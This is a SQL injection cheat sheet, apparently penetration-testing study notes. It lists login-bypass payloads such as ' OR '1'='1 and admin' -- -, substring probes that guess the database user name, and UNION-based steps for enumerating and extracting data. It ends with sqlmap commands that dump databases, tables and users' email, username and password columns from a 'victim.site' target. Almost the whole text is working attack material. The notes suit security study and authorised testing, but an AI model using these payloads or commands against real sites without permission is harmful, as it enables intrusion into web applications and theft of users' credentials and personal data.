## SQLi ##

# Syntax
SELECT <columns list> FROM <table> WHERE <condition>;
<select statement> UNION <other select statement>;

# Comments
# (the hash symbol)
-- (two dashes followed by a space!)

# Finding SQL Injections
string terminator:  ' and "
SQL commands: SELECT, UNION, e.t.c
SQL comments: # or -- 

## Cheatsheet ##    (dictionary: /usr/share/wfuzz/wordlist/Injections/SQL.txt)

 or 1=1; -- -
 or 1=2; -- -
'='
' OR '1'='1
' OR 'a'='a
' or ''='
\'or"1"="1"; -- 
admin' -- -
admin' #
admin'/*
' or 1=1 -- -
' or 1=1#
\' or 1=1#
' or 1=1/*
\' or 1=1/*
') or '1'='1 -- -
\') or '1'='1 -- -
') or ('1'='1 -- -
' OR substr(user(), 1, 1)= 'a       // check if current user's name starts from a
' OR substr(user(), 1, 1)= 'b
....
' OR substr(user(), 2, 1)= 'a       // check if current user's name has 'a' in the second place
' OR substr(user(), 2, 1)= 'b
....
' UNION SELECT user(); -- -
# Finding the number of fields of the original query
' UNION SELECT null; -- -
' UNION SELECT null, null; -- -       // assuming it has only 2 fields, when we try with 3 fields we will get an error message
....
# Test which fields are part of the output page
' UNION SELECT 'test1', 'test2'; -- -     // and check which one is displayed at the page (take a look at the source code of the page as well)
# Let's say the first field is part of the output page, now it's time to exploit the injection
' UNION SELECT user(), 'test2'; -- -

## SQLMap ##

# Syntax
# Exploit a GET method
sqlmap -u <URL> -p <injection parameter> [options]
sqlmap -u 'http://victim.site/view.php?id=113' -p id --technique=U      // use a UNION based SQLi technique
sqlmap -u 'http://victim.site/view.php?id=113' -p id --technique=U -v3 --fresh-queries  // see which payload sqlmap used

# Exploit a POST method
sqlmap -u <URL> --data=<POST string> -p parameter [options]
sqlmap -u <URL> --data='user=a&pass=a' -p user --technique=B --banner   // use Boolean technique to extract banner (POST method) at parameter 'user' (vuln to SQLi)    
sqlmap -u <URL> --data='user=a&pass=a' -p user --technique=B --dbs
sqlmap -u <URL> --data='user=a&pass=a' -p user --technique=B -D blogdb --tables


sqlmap -u <URL> --dbs --forms --banner --random-agent -v 3
sqlmap -u <URL> --dbms=mysql --forms --banner --random-agent -v 3
sqlmap -u <URL> --dbms=mysql --os=windows --forms --current-db --random-agent -v 3
sqlmap -u <URL> --dbms=mysql --os=windows --forms -D mydata --tables --random-agent -v 3
sqlmap -u <URL> --dbms=mysql --os=windows --forms -D mydata -T users --dump --random-agent -v 3
or going deeper
sqlmap -u <URL> --dbms=mysql --os=windows --forms -D mydata -T users --columns --random-agent -v 3
sqlmap -u <URL> --dbms=mysql --os=windows --forms -D mydata -T users -C email,username,password --dump --random-agent -v 3

# Run SQLMap against a saved request file
sqlmap -r Desktop/hackmeSQL.txt -p username,password --dbms=mysql --current-db --random-agent --tamper=space2comment --level 5 --risk 1

# Rerun a fresh session scan by flushing
sqlmap -r Desktop/hackmeSQL.txt -p username,password --dbms=mysql --current-db --random-agent --tamper=space2comment --level 5 --risk 1 --flush_session

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
